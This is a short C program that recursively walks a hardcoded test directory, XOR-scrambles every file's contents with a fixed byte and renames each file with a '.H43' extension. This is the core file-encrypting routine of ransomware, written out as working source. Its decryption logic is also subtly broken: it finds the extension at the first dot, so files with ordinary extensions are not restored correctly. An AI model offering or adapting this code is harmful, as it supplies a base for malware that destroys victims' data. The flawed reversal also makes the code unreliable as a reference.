#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#define RELATIVE_FOLDER "/home/jrx/Desktop/test/"
#define CRYPTO_NUM 21
#define CRYPTO_EXT ".H43"
#define CRYPTO_EXT_LEN 4
#define CRYPTO_ENV_NAME "H43_xor_encryption"
#define CRYPTO_ENV_VALUE "H43"

int encrypt = -1;

void xor_encr(char *file) {
  char *ext = strchr(file, '.');
  if (ext == NULL) {
    ext = file + strlen(file); // Point to end of string if no extension
  }

  if (encrypt == -1) {
    encrypt = strcmp(ext, CRYPTO_EXT) != 0; // Encrypt if doesn't have .H43
  } else if (encrypt != (strcmp(ext, CRYPTO_EXT) != 0)) {
    return;
  }

  FILE *fptr = fopen(file, "rb+");
  if (fptr == NULL) {
    perror("Error opening file");
    return;
  }

  // Get file size
  fseek(fptr, 0, SEEK_END);
  long length = ftell(fptr);
  fseek(fptr, 0, SEEK_SET);

  // Allocate memory
  char *content = malloc(length);
  if (content == NULL) {
    perror("Memory allocation failed");
    fclose(fptr);
    return;
  }

  // Read file
  if (fread(content, 1, length, fptr) != length) {
    perror("Error reading file");
    free(content);
    fclose(fptr);
    return;
  }

  // XOR encryption/decryption
  for (long i = 0; i < length; i++) {
    content[i] ^= CRYPTO_NUM;
  }

  // Write back to file
  rewind(fptr);
  if (fwrite(content, 1, length, fptr) != length) {
    perror("Error writing file");
  }

  // Cleanup
  free(content);
  fclose(fptr);

  // Handle file renaming
  if (encrypt) {
    // Encrypting: add .H43 extension
    char *new_file = malloc(strlen(file) + CRYPTO_EXT_LEN + 1);
    if (new_file == NULL) {
      perror("Memory allocation failed");
      return;
    }
    strcpy(new_file, file);
    strcat(new_file, CRYPTO_EXT);
    if (rename(file, new_file) != 0) {
      perror("Error renaming file");
    }
    free(new_file);
  } else {
    // Decrypting: remove .H43 extension
    char *old_file = strdup(file);
    if (old_file == NULL) {
      perror("Memory allocation failed");
      return;
    }
    *ext = '\0'; // Truncate at the extension
    if (rename(old_file, file) != 0) {
      perror("Error renaming file");
    }
    free(old_file);
  }
}

void direct(const char *folder) {
  DIR *dir = opendir(folder);
  if (dir == NULL) {
    perror("Error opening directory");
    return;
  }

  struct dirent *entry;
  struct stat info;
  while ((entry = readdir(dir)) != NULL) {
    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
      continue;
    }

    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s%s", folder, entry->d_name);

    if (stat(full_path, &info) == 0) {
      if (S_ISDIR(info.st_mode)) {
        char new_path[1024];
        snprintf(new_path, sizeof(new_path), "%s/", full_path);
        printf("Directory: %s\n", new_path);
        direct(new_path);
      } else if (S_ISREG(info.st_mode)) {
        printf("File: %s\n", full_path);
        xor_encr(full_path);
      }
    }
  }
  closedir(dir);
}

int main() {
  direct(RELATIVE_FOLDER);
  return 0;
}
